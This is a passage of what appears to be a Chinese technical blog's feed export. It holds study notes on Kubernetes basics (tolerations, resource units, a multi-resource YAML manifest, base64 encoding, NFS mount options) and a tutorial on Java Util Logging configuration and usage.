class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">tolerations:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">key:</span> <span class="hljs-string">&quot;key1&quot;</span><br>    <span class="hljs-params">operator:</span> <span class="hljs-string">&quot;In&quot;</span><br>    <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;value1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>]<br>    <span class="hljs-params">effect:</span> <span class="hljs-string">&quot;NoExecute&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="3-K8S-中的常用单位"><a href="#3-K8S-中的常用单位" class="headerlink" title="3. K8S 中的常用单位"></a>3. K8S 中的常用单位</h3><ol><li>&#x3D;&#x3D;存储容器&#x3D;&#x3D;：<ol><li>Ki、Mi、Gi、Ti</li></ol></li><li>&#x3D;&#x3D;cpu&#x3D;&#x3D;：<ol><li>1000m 是 1 核（逻辑 CPU 的核数，不是物理核数）</li></ol></li><li>&#x3D;&#x3D;memory（内存）&#x3D;&#x3D;<ol><li>Ki、Mi、Gi、Ti</li></ol></li></ol><hr><h3 id="4-资源清单"><a href="#4-资源清单" class="headerlink" title="4. 资源清单"></a>4. 资源清单</h3><p>之前我们通常会在一个 YAML 文件中定义一个资源，之后通过 <code>kubectl apply</code> 命令进行应用。</p><p>其实，在一个 YAML 文件中可以定义多个资源，通过 <code>---</code> 来分隔各个资源。我们通常将这样的文件称为“资源清单”。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Namespace</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-nginx</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-nginx</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">ingress-nginx</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-nginx-controller</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">ingress-nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">LoadBalancer</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-nginx-controller</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">ingress-nginx</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-base64-编码"><a href="#5-base64-编码" class="headerlink" title="5. base64 编码"></a>5. base64 编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 对字符串进行 base64 编码</span><br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;admin&quot;</span> | <span class="hljs-built_in">base64</span><br><br><br><span class="hljs-comment"># 2. 对文件内容进行 base64 编码，并输出编码后的结果</span><br><span class="hljs-built_in">base64</span> -w 0 user.crt              <span class="hljs-comment"># -w 0 选项表示不对输出进行换行，输出结果会是一个长的连续字符串</span><br><span class="hljs-built_in">base64</span> -w 0 user.key<br></code></pre></td></tr></table></figure><hr><h3 id="6-NFS-挂载参数"><a href="#6-NFS-挂载参数" class="headerlink" title="6. NFS 挂载参数"></a>6. NFS 挂载参数</h3><p>&#x3D;&#x3D;1.文件锁相关&#x3D;&#x3D;</p><table><thead><tr><th>参数</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td><code>nolock</code></td><td>禁用 NFS 文件锁，防止锁竞争问题</td><td>多节点读写时使用</td></tr><tr><td><code>lock</code></td><td>启用 NFS 文件锁（默认）</td><td>单节点挂载时推荐使用</td></tr><tr><td><code>nocto</code></td><td>不强制更新 <code>ctime</code> 和 <code>mtime</code> 缓存</td><td>提高性能，适合只读数据</td></tr><tr><td><code>actimeo=N</code></td><td>设置属性缓存时间，单位秒</td><td>提高性能，适合少改频读数据</td></tr></tbody></table><p>&#x3D;&#x3D;2.性能优化相关&#x3D;&#x3D;</p><table><thead><tr><th>参数</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td><code>rsize=xxx</code></td><td>读取块大小，默认 <code>1048576</code> 字节</td><td>增大块大小提升吞吐量</td></tr><tr><td><code>wsize=xxx</code></td><td>写入块大小，默认 <code>1048576</code> 字节</td><td>增大块大小提升写入性能</td></tr><tr><td><code>async</code></td><td>异步写入数据（默认）</td><td>性能更高，但存在数据丢失风险</td></tr><tr><td><code>sync</code></td><td>同步写入数据，数据立即写入磁盘</td><td>数据一致性要求高时使用</td></tr><tr><td><code>noatime</code></td><td>不更新文件访问时间</td><td>提高性能，适合频繁读取的大量小文件</td></tr><tr><td><code>nodiratime</code></td><td>不更新目录访问时间</td><td>类似 <code>noatime</code>，作用于目录</td></tr></tbody></table><p>&#x3D;&#x3D;3.端口协议相关&#x3D;&#x3D;</p><table><thead><tr><th>参数</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td><code>noresvport</code></td><td>使用非保留端口通信（1024 以上端口）</td><td>防止端口冲突，常用在容器环境</td></tr><tr><td><code>resvport</code></td><td>使用保留端口通信（默认）</td><td>默认端口（1024 以下），适合传统环境</td></tr><tr><td><code>proto=tcp</code></td><td>使用 TCP 协议（默认）</td><td>稳定性好，常用</td></tr><tr><td><code>proto=udp</code></td><td>使用 UDP 协议</td><td>低延迟，适合低丢包网络</td></tr><tr><td><code>vers=4.0</code></td><td>使用 NFS v4.0 协议</td><td>默认使用 4.0，性能更优</td></tr><tr><td><code>vers=3</code></td><td>使用 NFS v3 协议</td><td>兼容性更好，但性能稍差</td></tr></tbody></table><p>&#x3D;&#x3D;4.安全性相关&#x3D;&#x3D;</p><table><thead><tr><th>参数</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td><code>sec=sys</code></td><td>使用本地 UID&#x2F;GID 进行身份验证</td><td>默认方式</td></tr><tr><td><code>sec=krb5</code></td><td>使用 Kerberos 认证</td><td>安全性更高</td></tr><tr><td><code>ro</code></td><td>挂载为只读</td><td>防止意外修改</td></tr><tr><td><code>rw</code></td><td>挂载为读写（默认）</td><td>可读可写，默认模式</td></tr><tr><td><code>anonuid=xxx</code></td><td>将匿名用户映射为指定 UID</td><td>提高安全性</td></tr><tr><td><code>anongid=xxx</code></td><td>将匿名用户映射为指定 GID</td><td>提高安全性</td></tr></tbody></table><hr><h3 id="7-对-角色（Role）的理解"><a href="#7-对-角色（Role）的理解" class="headerlink" title="7. 对 角色（Role）的理解"></a>7. 对 角色（Role）的理解</h3><p>角色是一系列权限的集合</p><hr>]]></content>
    
    
    <categories>
      
      <category>容器化</category>
      
      <category>Kubernetes 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：23 种设计模式</title>
    <link href="/2025/03/11/%E7%AC%94%E8%AE%B0%EF%BC%9A23%20%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2025/03/11/%E7%AC%94%E8%AE%B0%EF%BC%9A23%20%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="0、导图：Map：23种设计模式"><a href="#0、导图：Map：23种设计模式" class="headerlink" title="0、导图：Map：23种设计模式"></a>0、导图：<a href="Map%EF%BC%9A23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.xmind">Map：23种设计模式</a></h3>]]></content>
    
    
    <categories>
      
      <category>设计模式</category>
      
      <category>23 种 设计模式</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java 日志记录</title>
    <link href="/2025/03/11/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/03/11/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="0、导图：Map：日志框架"><a href="#0、导图：Map：日志框架" class="headerlink" title="0、导图：Map：日志框架"></a>0、导图：<a href="Map%EF%BC%9A%E6%97%A5%E5%BF%97%E6%A1%86%E6%9E%B6.xmind">Map：日志框架</a></h3><hr><h3 id="1、框架发展史"><a href="#1、框架发展史" class="headerlink" title="1、框架发展史"></a>1、框架发展史</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/image-20250311223318675.png"></p><hr><h3 id="2、JUL-实现框架"><a href="#2、JUL-实现框架" class="headerlink" title="2、JUL 实现框架"></a>2、JUL 实现框架</h3><h4 id="2-1、JUL-概述"><a href="#2-1、JUL-概述" class="headerlink" title="2.1、JUL 概述"></a>2.1、JUL 概述</h4><p>JUL 全称 Java Util Logging，是 JDK 内置的日志记录框架，使用时无需额外引入第三方库，使用相对简单。虽然能满足一般应用的日志需求，但相比 Log4j、SLF4J 等第三方框架，其扩展性和高级特性较为有限，更适合中小型项目或对日志需求较为简单的场景。</p><hr><h4 id="2-2、JUL-组件介绍"><a href="#2-2、JUL-组件介绍" class="headerlink" title="2.2、JUL 组件介绍"></a>2.2、JUL 组件介绍</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/image-20250311134645238.png" alt="|500"></p><ol><li><font color="#00b0f0">Logger</font>：<ol><li>Logger（记录器）是日志框架的入口，我们通过调用 <code>Logger.getLogger(String name)</code> 获取 Logger 实例，并调用其方法记录日志信息。<ol><li><font color="#6425d0">name</font>：<code>name</code> 作为 Logger 的唯一标识，指定获取的 Logger 的层级，通常使用 <strong>全类名</strong> 或 <strong>包名</strong> 进行命名，以便于<strong>实现层级化日志管理</strong></li></ol></li><li><code>Logger</code> 会根据本 <code>Logger</code> 的日志级别来记录需要的日志<font color="#ff0000">（简单理解为：第一层过滤</font>）。对于低于设定级别的日志，即使你调用了日志记录方法（如 <code>logger.config(xxx)</code>），这些日志也不会被记录。</li></ol></li><li><font color="#00b0f0">Filter</font>：<ol><li>Filter（过滤器） 用于在日志记录被发送到 Handler 之前进行筛选，可以根据定制决定哪些日志信息应该被接受，哪些应被过滤掉（<font color="#ff0000">简单理解为：第二层过滤</font>）</li></ol></li><li><font color="#00b0f0">Handler</font>：<ol><li>Handler（处理器），负责接收 Logger 记录的日志，并将日志消息输出到指定目标，常见的 Handler 包括：<ol><li><font color="#7030a0">ConsoleHandler</font>：日志输出到控制台</li><li><font color="#7030a0">FileHandler</font>：日志写入文件</li><li><font color="#7030a0">SocketHandler</font>：日志发送至网络端点</li><li><font color="#7030a0">MemoryHandler</font>：日志暂存于内存，满足条件时批量输出</li></ol></li><li>一个 Logger 可以关联多个 Handler，以便将日志信息分发到不同的输出目标</li><li><code>Handler</code> 会根据本 <code>Handler</code> 的日志级别来输出需要的日志（<font color="#ff0000">简单理解为：第三层过滤</font>）。对于低于设定级别的日志，即使 <code>Logger</code> 将其传递过来，这些日志也不会被输出。</li></ol></li><li><font color="#00b0f0">Formatter</font>：<ol><li>Formatter（格式化组件） 定义了日志消息的输出格式。JUL 提供了两种默认的 Formatter：<ol><li><font color="#7030a0">SimpleFormatter</font>：简单、易读的文本格式</li><li><font color="#7030a0">XMLFormatter</font>：以 XML 格式输出日志</li></ol></li><li>你可以通过扩展 <code>Formatter</code> 类来自定义输出格式</li></ol></li><li><font color="#00b0f0">Level</font><ol><li>Level（验证级别）定义了日志级别，常见的级别顺序为：<ol><li><font color="#7030a0">OFF</font>：禁止捕获所有级别的日志信息</li><li><font color="#7030a0">SEVERE</font>：错误信息，表示严重错误或异常情况，应用可能无法继续运行</li><li><font color="#7030a0">WARNING</font>：警告信息，提示潜在的问题，但应用仍然可以继续运行</li><li><font color="#7030a0">INFO</font>：输出常规运行信息，提供系统运行状态</li><li><font color="#7030a0">CONFIG</font>：输出配置项信息</li><li><font color="#7030a0">FINE</font>：调试信息（少），详细调试时使用</li><li><font color="#7030a0">FINER</font>：调试信息（中），详细调试时使用</li><li><font color="#7030a0">FINEST</font>：调试信息（多），详细调试时使用</li><li><font color="#7030a0">ALL</font>：捕获所有级别的日志信息</li></ol></li></ol></li></ol><hr><h4 id="2-3、JUL-特性介绍"><a href="#2-3、JUL-特性介绍" class="headerlink" title="2.3、JUL 特性介绍"></a>2.3、JUL 特性介绍</h4><p>JUL 是一个具备层次结构的日志记录器，采用父子关系进行组织。简单来说，<code>com</code> 是 <code>com.example</code> 的父级，而 <code>com.example</code> 又是 <code>com.example.test</code> 的父级。而最顶层的 <code>com</code> 则以根日志（ <code>RootLogger</code>） 作为其父级。</p><p>JUL 具有继承的特性。如果我们没有为子级 Logger 手动设置日志级别，它会默认继承父级 Logger 的日志级别。</p><p>JUL 具有日志向上传递的特性。每当子级 Logger（如 <code>com.example</code>）记录一条日志时，首先会通过自身配置的 <code>Handler</code> 输出。随后，这条日志会向上传递至父级 Logger，并通过父级的 <code>Handler</code> 输出（不会再经过父级 Logger 的日志级别过滤）。这个向上传递过程会逐级进行，最终到达最顶层的 <code>RootLogger</code>，并通过其 <code>Handler</code> 输出。除非我们显式禁用这种向上传递行为（通过 <code>setUseParentHandlers(false)</code>），否则日志始终会沿着层次结构向上传递。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>由于日志是逐条向上传递的，而不是等到底层 <code>Handler</code> 输出后再整体传递，因此可能会看到类似以下的日志输出：</li></ol></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>严重: severe 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>严重: severe 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>严重: severe 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>警告: warning 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>警告: warning 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>警告: warning 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>信息: info 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>信息: info 信息<br><span class="hljs-number">3</span>月 <span class="hljs-number">12</span>, <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">47</span>:<span class="hljs-number">37</span> 上午 com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.Main</span> <span class="hljs-selector-tag">main</span><br>信息: info 信息<br></code></pre></td></tr></table></figure><hr><h4 id="2-4、JUL-实战步骤"><a href="#2-4、JUL-实战步骤" class="headerlink" title="2.4、JUL 实战步骤"></a>2.4、JUL 实战步骤</h4><h5 id="2-4-1、配置根日志记录器（RootLogger）"><a href="#2-4-1、配置根日志记录器（RootLogger）" class="headerlink" title="2.4.1、配置根日志记录器（RootLogger）"></a>2.4.1、配置根日志记录器（RootLogger）</h5><p>找到并修改 <code>$&#123;JAVA_HOME&#125;/conf/logging.properties</code> 以进行相关配置：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 1. 指定 Root Logger 的日志级别</span><br>.level = INFO  <br><br><span class="hljs-comment"># 2. 指定 Root Logger 的日志处理器（Handler）</span><br>handlers = <span class="hljs-keyword">java.util.logging.ConsoleHandler, </span><span class="hljs-keyword">java.util.logging.FileHandler</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># 3. 对 ConsoleHandler 日志处理器进行配置</span><br><span class="hljs-keyword">java.util.logging.ConsoleHandler.level </span>= INFO                                    <span class="hljs-comment"># 处理器的日志级别</span><br><span class="hljs-keyword">java.util.logging.ConsoleHandler.formatter </span>= <span class="hljs-keyword">java.util.logging.SimpleFormatter </span>  <span class="hljs-comment"># 日志的输出格式</span><br><br><span class="hljs-comment"># 4. 对 FileHandler 日志处理器进行配置</span><br><span class="hljs-keyword">java.util.logging.FileHandler.level </span>= ALL                  <span class="hljs-comment"># 处理器的日志级别</span><br><span class="hljs-keyword">java.util.logging.FileHandler.pattern </span>= D:\\EnglishDeployment\\logs\\<span class="hljs-keyword">JUL.%g.log </span>  <span class="hljs-comment"># 日志文件存放位置</span><br><span class="hljs-keyword">java.util.logging.FileHandler.limit </span>= <span class="hljs-number">10485760</span>             <span class="hljs-comment"># 单个日志文件最大10485760字节（10MB）</span><br><span class="hljs-keyword">java.util.logging.FileHandler.count </span>= <span class="hljs-number">5</span>                    <span class="hljs-comment"># 日志文件的最大数量</span><br><span class="hljs-keyword">java.util.logging.FileHandler.append </span>= true                <span class="hljs-comment"># 以追加模式</span><br><span class="hljs-keyword">java.util.logging.FileHandler.formatter </span>= <span class="hljs-keyword">java.util.logging.SimpleFormatter </span> <span class="hljs-comment"># 日志的输出格式（默认是 XML 方式）</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果需要将日志写入文件（即使用 <code>FileHandler</code>），需要注意以下三点：<ul><li>由于 JUL 只创建文件而不会自动生成目录，因此必须手动创建 <code>logs</code> 目录，并确保程序具有相应的读写权限。</li><li>此外，需要注意文件路径的格式应使用 <code>\\</code> 而非 <code>\</code></li><li>最后，需要了解 JUL 中的日志轮换机制：JUL 将日志记录在 <code>JUL.0.log</code> 文件中。当文件写满时，它会被重命名为 <code>JUL.1.log</code>，同时创建一个新的 <code>JUL.0.log</code> 继续记录。随着日志再次写满，<code>JUL.1.log</code> 会被重命名为 <code>JUL.2.log</code>，而 <code>JUL.0.log</code> 则再次重命名为 <code>JUL.1.log</code>，这样依次进行。当文件数量达到最大限制时，最早的日志文件（如 <code>JUL.4.log</code>）将被删除，以腾出空间（该机制与 Log4J2 的轮换机制不同，Log4J2 是数字越小，文件越旧）</li></ul></li><li>建议在实际配置时移除所有注释和空格，以避免注释中隐藏的特殊字符引起解析错误，以下是纯净版本：</li></ol></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">.level = INFO<br>  <br>handlers = <span class="hljs-keyword">java.util.logging.ConsoleHandler, </span><span class="hljs-keyword">java.util.logging.FileHandler</span><br><span class="hljs-keyword"></span>  <br><span class="hljs-keyword">java.util.logging.ConsoleHandler.level </span>= INFO<br><span class="hljs-keyword">java.util.logging.ConsoleHandler.formatter </span>= <span class="hljs-keyword">java.util.logging.SimpleFormatter</span><br><span class="hljs-keyword"></span>  <br><span class="hljs-keyword">java.util.logging.FileHandler.level </span>= ALL<br><span class="hljs-keyword">java.util.logging.FileHandler.pattern </span>= D:\\EnglishDeployment\\logs\\<span class="hljs-keyword">JUL.%g.log</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java.util.logging.FileHandler.limit </span>= <span class="hljs-number">10485760</span><br><span class="hljs-keyword">java.util.logging.FileHandler.count </span>= <span class="hljs-number">5</span><br><span class="hljs-keyword">java.util.logging.FileHandler.append </span>= true<br><span class="hljs-keyword">java.util.logging.FileHandler.formatter </span>= <span class="hljs-keyword">java.util.logging.SimpleFormatter</span><br></code></pre></td></tr></table></figure><hr><h5 id="2-4-2、-代码中为某个特定包或类的-Logger-单独配置（可选）"><a href="#2-4-2、-代码中为某个特定包或类的-Logger-单独配置（可选）" class="headerlink" title="2.4.2、 代码中为某个特定包或类的 Logger 单独配置（可选）"></a>2.4.2、 代码中为某个特定包或类的 Logger 单独配置（可选）</h5><p>对于某些包下的代码，如果我们不希望完全沿用 Root Logger 的配置，可以在代码中手动为这些包单独设置 Logger。</p><p>例如，在下面的例子中，我们为 <code>com.example.Main</code> 层级的 Logger 进行了独立配置，这样它就不再使用 Root Logger 的日志级别，也不会将日志向上传递到 Root Logger 的 Handler 进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>    <br>        <span class="hljs-comment">// 1. 获取 ConsoleHandler 日志处理器  </span><br>        <span class="hljs-type">ConsoleHandler</span> <span class="hljs-variable">consoleHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsoleHandler</span>();  <br>        <br>        <span class="hljs-comment">// 2. 获取 SimpleFormatter 格式化组件  </span><br>        <span class="hljs-type">SimpleFormatter</span> <span class="hljs-variable">simpleFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleFormatter</span>();  <br>        <br>        <span class="hljs-comment">// 3， 将格式化组件设置到日志处理器中  </span><br>        consoleHandler.setFormatter(simpleFormatter);  <br>        <br>        <span class="hljs-comment">// 4. 获取 /com/example/Main 层的 Logger        </span><br>        <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> Logger.getLogger(Main.class.getName());  <br>        <br>        <span class="hljs-comment">// 5. 设置该层 Logger 的属性  </span><br>        logger.setLevel(Level.INFO);  <br>        logger.setUseParentHandlers(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// 禁用向上传递</span><br>        logger.addHandler(consoleHandler);  <br>        <br>        <span class="hljs-comment">// 6. 调用 Logger 记录日志  </span><br>        logger.severe(<span class="hljs-string">&quot;severe 信息&quot;</span>);  <br>        logger.warning(<span class="hljs-string">&quot;warning 信息&quot;</span>);  <br>        logger.info(<span class="hljs-string">&quot;info 信息&quot;</span>);  <br>        logger.config(<span class="hljs-string">&quot;config 信息&quot;</span>);  <br>        logger.fine(<span class="hljs-string">&quot;fine 信息&quot;</span>);  <br>        logger.finer(<span class="hljs-string">&quot;finer 信息&quot;</span>);  <br>        logger.finest(<span class="hljs-string">&quot;finest 信息&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-3-2、调用-JUL-Logger-记录日志"><a href="#2-3-2、调用-JUL-Logger-记录日志" class="headerlink" title="2.3.2、调用 JUL-Logger 记录日志"></a>2.3.2、调用 JUL-Logger 记录日志</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;  <br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;  <br>Logger logger = Logger.getLogger(Main.<span class="hljs-keyword">class</span>.getName());   // 获取指定层级的 Logger，这里获取的是 com.example.Main 层级的 Logger（可以传入 <span class="hljs-type">name</span>.<span class="hljs-keyword">class</span>.getName()，也可以直接传入全类名字符串：&quot;com.example.Main&quot;）<br><br>logger.severe(&quot;severe 信息&quot;);  <br>        logger.<span class="hljs-built_in">warning</span>(&quot;warning 信息&quot;);  <br>        logger.<span class="hljs-keyword">info</span>(&quot;info 信息&quot;);  <br>        logger.config(&quot;config 信息&quot;);  <br>        logger.fine(&quot;fine 信息&quot;);  <br>        logger.finer(&quot;finer 信息&quot;);  <br>        logger.finest(&quot;finest 信息&quot;);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>Logger 要来自 <code>Java.util.Logging</code> 包下</li><li>由于我们没有为 Main 层的 Logger 手动设置日志级别，它会默认继承父 Logger（<code>Root Logger</code>）的日志级别。此外，因为 Main 层 Logger 也没有单独配置自己的 Handler，所以它会将日志向上传递，并使用父 Logger（<code>Root Logger</code>）的 Handler 